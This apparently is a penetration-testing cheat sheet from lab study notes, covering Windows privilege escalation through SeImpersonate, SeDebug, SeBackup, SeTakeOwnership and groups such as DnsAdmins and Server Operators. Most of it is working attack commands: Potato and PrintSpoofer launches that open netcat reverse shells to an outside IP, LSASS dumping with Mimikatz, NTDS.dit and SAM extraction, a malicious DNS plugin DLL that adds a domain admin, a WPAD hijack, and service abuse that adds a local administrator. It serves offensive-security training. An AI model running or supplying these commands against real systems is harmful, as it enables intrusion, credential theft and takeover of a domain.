# Windows Privilege Abuse

## SeImpersonate / SeAssignPrimaryToken

### Overview
- Service accounts (IIS, MSSQL, etc.) often have SeImpersonatePrivilege
- Allows impersonating a privileged account such as NT AUTHORITY\SYSTEM
- "Potato" style attacks trick a SYSTEM process into connecting to our process, handing over its token

### Check for the Privilege
```cmd
whoami /priv
```
- Look for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`

### JuicyPotato (< Windows Server 2019 / Win10 1809)
```cmd
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

### PrintSpoofer (Windows Server 2019+ / Win10 1809+)
```cmd
PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

### RoguePotato
- Alternative to JuicyPotato for newer Windows versions
- https://github.com/antonioCoco/RoguePotato

### Common Scenario: MSSQL xp_cmdshell
```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```
```sql
enable_xp_cmdshell
xp_cmdshell whoami /priv
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

## SeDebugPrivilege

### Overview
- Allows attaching to or opening any process, even those owned by SYSTEM
- Often assigned to developers for debugging
- Can dump LSASS for credential theft or spawn a SYSTEM child process

### Dump LSASS with ProcDump
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### Extract Hashes with Mimikatz
```
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Alternative: Task Manager LSASS Dump
- Details tab > right-click lsass.exe > "Create dump file"
- Download and process offline with Mimikatz

### RCE as SYSTEM via Parent Process
- Use psgetsys.ps1 to spawn a child process inheriting a SYSTEM parent token
- Target winlogon.exe (runs as SYSTEM)
```powershell
[MyProcess]::CreateProcessFromParent((Get-Process lsass).Id, "C:\Windows\System32\cmd.exe", "")
```

## SeTakeOwnershipPrivilege

### Overview
- Grants ability to take ownership of any securable object (files, folders, registry, services)
- Can read protected files by taking ownership then modifying ACLs

### Enable the Privilege
```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

### Take Ownership and Read File
```cmd
takeown /f "C:\Department Shares\Private\IT\cred.txt"
icacls "C:\Department Shares\Private\IT\cred.txt" /grant htb-student:F
type "C:\Department Shares\Private\IT\cred.txt"
```

### Interesting Files to Target
```
c:\inetpub\wwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

## SeBackupPrivilege (Backup Operators Group)

### Overview
- Allows traversing any folder and copying files regardless of ACLs
- Must use `FILE_FLAG_BACKUP_SEMANTICS` flag (not standard copy)
- Members can log in locally to Domain Controllers

### Enable and Use
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

### Copy NTDS.dit from Domain Controller
```
diskshadow.exe
> set verbose on
> set metadata C:\Windows\Temp\meta.cab
> set context clientaccessible
> set context persistent
> begin backup
> add volume C: alias cdrive
> create
> expose %cdrive% E:
> end backup
> exit
```
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

### Extract Hashes
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

### Robocopy Alternative
```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

## Event Log Readers Group
- Members can read Security event logs
- If process command line auditing is enabled (Event ID 4688), may find passwords in logs

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

## DnsAdmins Group

### Attack: Load Malicious DLL via DNS Service
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
sc stop dns
sc start dns
```

### Cleanup
```cmd
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
sc start dns
```

### WPAD Record Attack (Alternative)
```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

## Print Operators Group (SeLoadDriverPrivilege)
- Can load vulnerable kernel drivers (e.g., Capcom.sys)
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
EnableSeLoadDriverPrivilege.exe
.\ExploitCapcom.exe
```
- Automate with EoPLoadDriver: `EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`
- Note: Not exploitable since Windows 10 Version 1803

## Server Operators Group
- Members have SERVICE_ALL_ACCESS on many services
- Can modify service binary path and restart services
```cmd
sc config AppReadiness binpath= "cmd /c net localgroup Administrators server_adm /add"
sc start AppReadiness
```

## Hyper-V Administrators
- Full access to all Hyper-V features
- If DCs are virtualized, consider them Domain Admins
- Can clone live DC, mount virtual disk offline, extract NTDS.dit
